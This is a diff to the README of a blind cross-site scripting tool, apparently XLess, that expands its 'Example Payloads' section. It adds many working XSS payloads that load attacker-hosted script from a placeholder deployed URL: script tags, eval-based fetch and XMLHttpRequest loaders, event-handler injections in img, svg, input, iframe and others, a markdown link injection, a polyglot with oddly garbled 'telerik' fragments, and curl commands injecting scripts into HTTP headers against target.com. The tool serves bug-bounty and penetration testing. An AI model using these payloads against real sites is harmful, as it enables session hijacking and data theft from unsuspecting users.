@@ -103,17 +103,95 @@ $ node index.js
 ```
 
 
-## :speech_balloon: Example Payload
+## :speech_balloon: Example Payloads
 
+> Replace `YOUR_XLESS_URL` with your deployed URL:
+> - **Vercel**: `https://your-app.vercel.app`
+> - **Netlify**: `https://your-app.netlify.app`
+
+### Basic Script Tag
 ```html
-<script src="https://your-xless-app.vercel.app"></script>
+<script src="https://YOUR_XLESS_URL"></script>
 ```
 
+### Script Tag with Closing Quote Escape
+```html
+'"><script src="https://YOUR_XLESS_URL"></script>
+```
+
+### JavaScript URI (Bookmarklet / Href Injection)
 ```javascript
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://your-xless-app.vercel.app\';document.body.appendChild(a)')
+javascript:eval('var a=document.createElement("script");a.src="https://YOUR_XLESS_URL";document.body.appendChild(a)')
 ```
 
-More payloads available at `https://your-xless-app.vercel.app/examples`
+### XMLHttpRequest Loader
+```html
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","https://YOUR_XLESS_URL");a.send();</script>
+```
+
+### jQuery (if available on target)
+```html
+<script>$.getScript("https://YOUR_XLESS_URL")</script>
+```
+
+### Fetch API
+```html
+<script>fetch("https://YOUR_XLESS_URL").then(r=>r.text()).then(eval)</script>
+```
+
+### IMG Tag with onerror
+```html
+<img src=x onerror="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+```
+
+### SVG Tag
+```html
+<svg onload="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+```
+
+### Input Tag with onfocus + autofocus
+```html
+<input onfocus="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)" autofocus>
+```
+
+### iframe Injection
+```html
+<iframe src="javascript:var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+```
+
+### Event Handler Variants
+```html
+<body onload="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+<details open ontoggle="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+<marquee onstart="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
+```
+
+### Markdown Injection (for apps that render markdown)
+```markdown
+[Click me](javascript:eval\('var%20a=document.createElement\("script"\);a.src="https://YOUR_XLESS_URL";document.body.appendChild\(a\)'\))
+```
+
+### Polyglot Payload
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%0telerik11telerik/telerik/*/</stYle/</telerik/</teleTelerik/</noeembed/</noscRipt/</seLect/</scRipt/--><sVg/telerik/oNloAd=var+s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)//>
+```
+
+### Blind XSS in HTTP Headers (via curl)
+```bash
+# User-Agent injection
+curl -A "<script src='https://YOUR_XLESS_URL'></script>" https://target.com
+
+# Referer injection
+curl -H "Referer: <script src='https://YOUR_XLESS_URL'></script>" https://target.com
+```
+
+### OOB Callback Test
+```bash
+# Simple callback test to verify your listener is working
+curl https://YOUR_XLESS_URL/test-callback
+```
+
+More payloads auto-generated at `https://YOUR_XLESS_URL/examples`
 
 
 ## :incoming_envelope: Collected Data
